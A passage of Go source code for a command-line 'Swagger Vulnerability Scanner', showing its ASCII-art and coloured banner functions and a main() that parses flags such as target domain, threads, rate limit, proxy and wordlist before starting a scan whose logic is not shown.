███████╗██║ █╗ ██║███████║██║  ███╗██║  ███╗█████╗  ██████╔╝
╚════██║██║███╗██║██╔══██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
███████║╚███╔███╔╝██║  ██║╚██████╔╝╚██████╔╝███████╗██║  ██║
╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
███████╗ ██████╗ ██████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██╔════╝██╔═══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
███████╗██║     ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
╚════██║██║     ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
███████║╚██████╗╚██████╔╝██║ ╚████║██║ ╚████║███████╗██║  ██║
╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
=============================================================
                 Swagger Vulnerability Scanner
                     Version: %s
             Discover • Analyze • Secure • Report
=============================================================`

	// Create color gradient effect
	colors := []func(interface{}) aurora.Value{
		au.Cyan,
		au.BrightCyan,
		au.Blue,
		au.BrightBlue,
		au.Magenta,
		au.BrightMagenta,
	}
	
	lines := strings.Split(banner, "\n")
	for i, line := range lines {
		if line == "" {
			continue
		}
		colorIndex := i % len(colors)
		if i == len(lines)-3 { // Version line
			fmt.Println(colors[colorIndex](fmt.Sprintf(line, Version)))
		} else {
			fmt.Println(colors[colorIndex](line))
		}
	}
	fmt.Println()
}

// displayMiniBanner displays a smaller banner for scan start
func displayMiniBanner(domain string) {
	au := aurora.NewAurora(true)
	
	miniBanner := `
┌────────────────────────────────────────────────────────────┐
│                    SWAGGER SCANNER v%s                    │
├────────────────────────────────────────────────────────────┤
│  Target: %-50s │
│  Started: %-48s │
└────────────────────────────────────────────────────────────┘`
	
	currentTime := time.Now().Format("2006-01-02 15:04:05")
	fmt.Println(au.Cyan(fmt.Sprintf(miniBanner, Version, domain, currentTime)))
	fmt.Println()
}

// Main function
func main() {
	var (
		domain      = flag.String("d", "", "Domain to scan (required)")
		configPath  = flag.String("c", "", "Path to configuration file")
		threads     = flag.Int("t", DefaultThreads, "Number of threads")
		outputDir   = flag.String("o", "results", "Output directory")
		verbose     = flag.Bool("v", false, "Verbose output")
		rateLimit   = flag.Int("r", RateLimit, "Rate limit (requests per second)")
		noTest      = flag.Bool("no-test", false, "Skip endpoint testing")
		timeout     = flag.Int("timeout", 30, "Timeout in seconds")
		proxy       = flag.String("proxy", "", "HTTP proxy to use")
		wordlist    = flag.String("w", "", "Path to subdomain wordlist")
		version     = flag.Bool("version", false, "Show version")
	)
	
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Swagger Vulnerability Scanner v%s\n\n", Version)
		fmt.Fprintf(os.Stderr, "Usage: %s [options]\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  %s -d example.com\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -d example.com -t 100 -r 10 -o ./scan_results\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -d example.com -c config.yaml -v\n", os.Args[0])
	}
	
	flag.Parse()

	
	
	
	if *version {
		fmt.Printf("Swagger Vulnerability Scanner v%s\n", Version)
		os.Exit(0)
	}
	
	if *domain == "" {
		displayBanner()
		flag.Usage()
		os.Exit(1)
	}
	
	// Display banner
	displayBanner()
	displayMiniBanner(*domain)

	// Create scanner
	scanner, err := NewSwaggerScanner(*configPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
	
	// Override config with command line arguments
	if *threads > 0 {
		scanner.config.Scanner.Threads = *threads
	}
	if *outputDir != "" {
		scanner.config.Output.Directory = *outputDir
	}
	if *verbose {
		scanner.config.Output.Verbose = true
		scanner.logger = scanner.logger.Level(zerolog.DebugLevel)
	}
	if *rateLimit > 0 {
		scanner.config.Scanner.RateLimit = *rateLimit
	}
	if *timeout > 0 {
		scanner.config.Scanner.Timeout = *timeout
	}
	if *proxy != "" {
		scanner.config.Scanner.Proxy = *proxy
	}
	if *wordlist != "" {
		scanner.config.Wordlists.Subdomains = *wordlist
	}
	if *noTest {
		scanner.config.Swagger.TestEndpoints = false
	}
	
	// Run scan
	if err := scanner.Run(*domain); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
}
